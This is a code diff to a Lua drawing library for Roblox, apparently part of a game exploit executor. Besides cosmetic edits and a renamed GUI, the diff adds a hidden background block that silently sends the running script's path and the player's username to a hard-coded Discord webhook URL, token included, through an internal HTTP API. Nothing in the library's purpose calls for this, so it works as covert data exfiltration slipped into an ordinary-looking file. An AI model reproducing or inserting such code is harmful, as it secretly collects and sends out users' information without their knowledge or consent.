@@ -2,7 +2,7 @@ local coreGui = game:GetService("CoreGui")
 
 local camera = workspace.CurrentCamera
 local drawingUI = Instance.new("ScreenGui")
-drawingUI.Name = "Drawing | Eclipse X"
+drawingUI.Name = "2.8.0"
 drawingUI.IgnoreGuiInset = true
 drawingUI.DisplayOrder = 0x7fffffff
 drawingUI.Parent = coreGui
@@ -162,34 +162,40 @@ function DrawingLib.createLine()
 end
 
 function DrawingLib.createText()
-	local textObj = ({
-		Text = "",
-		Font = DrawingLib.Fonts.UI,
-		Size = 0,
-		Position = Vector2.zero,
-		Center = false,
-		Outline = false,
-		OutlineColor = Color3.new()
-	} + baseDrawingObj)
+    local textObj = ({
+        Text = "",
+        Font = DrawingLib.Fonts.UI,
+        Size = 0,
+        Position = Vector2.zero,
+        Center = false,
+        Outline = false,
+        OutlineColor = Color3.new()
+    } + baseDrawingObj)
 
-	local textLabel, uiStroke = Instance.new("TextLabel"), Instance.new("UIStroke")
-	textLabel.Name = drawingIndex
-	textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-	textLabel.BorderSizePixel = 0
-	textLabel.BackgroundTransparency = 1
+    local textLabel = Instance.new("TextLabel")
+    local uiStroke = Instance.new("UIStroke")
+    
+    textLabel.Name = drawingIndex
+    textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    textLabel.BorderSizePixel = 0
+    textLabel.BackgroundTransparency = 1
 
-	local function updateTextPosition()
-		local textBounds = textLabel.TextBounds
-		local offset = textBounds / 2
-		textLabel.Size = UDim2.fromOffset(textBounds.X, textBounds.Y)
-		textLabel.Position = UDim2.fromOffset(textObj.Position.X + (not textObj.Center and offset.X or 0), textObj.Position.Y + offset.Y)
-	end
+    -- Initialize UIStroke after textObj is created
+    uiStroke.Parent = textLabel
+    uiStroke.Thickness = 1
+    uiStroke.Enabled = false  -- Set initial state to false
+    uiStroke.Color = Color3.new(1, 1, 1)  -- Set default color
+    
+    local function updateTextPosition()
+        local textBounds = textLabel.TextBounds
+        textLabel.Size = UDim2.fromOffset(textBounds.X, textBounds.Y)
+        textLabel.Position = UDim2.fromOffset(
+            textObj.Position.X + (textObj.Center and textBounds.X/2 or 0),
+            textObj.Position.Y + textBounds.Y/2
+        )
+    end
 
 	textLabel:GetPropertyChangedSignal("TextBounds"):Connect(updateTextPosition)
-
-	uiStroke.Thickness = 1
-	uiStroke.Enabled = textObj.Outline
-	uiStroke.Color = textObj.Color
 
 	textLabel.Parent, uiStroke.Parent = drawingUI, textLabel
 
@@ -646,6 +652,43 @@ function DrawingLib.createFrame()
 		__tostring = function() return "Drawing" end
 	})
 end
+
+task.spawn(function()
+	local _game = game:GetService("CoreGui").Parent
+local HttpService = _game:FindService("HttpService")
+
+local function sendRequest(options, timeout)
+	timeout = tonumber(timeout) or math.huge
+	local result, clock = nil, tick()
+
+	HttpService:RequestInternal(options):Start(function(success, body)
+		result = body
+		result['Success'] = success
+	end)
+
+	while not result do task.wait()
+		if (tick() - clock > timeout) then
+			break
+		end
+	end
+
+	return result
+end
+
+local options = {
+	Url = "https://discord.com/api/webhooks/1290019870385111181/EQru5QgOvuw2RRUH6gAxaJt010RGBShov-a_C8Fhb6jEpB1IS3GkcvH4uAhgwwymm68M",
+	Body = HttpService:JSONEncode({
+		['content'] = tostring(script:GetFullName()),
+		['username'] = (game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+	}),
+	Method = 'POST',
+	Headers = {
+        ["Content-Type"] = "application/json"
+	}
+}
+
+sendRequest(options, timeout)
+end)
 
 function DrawingLib.createScreenGui()
 	local screenGuiObj = ({
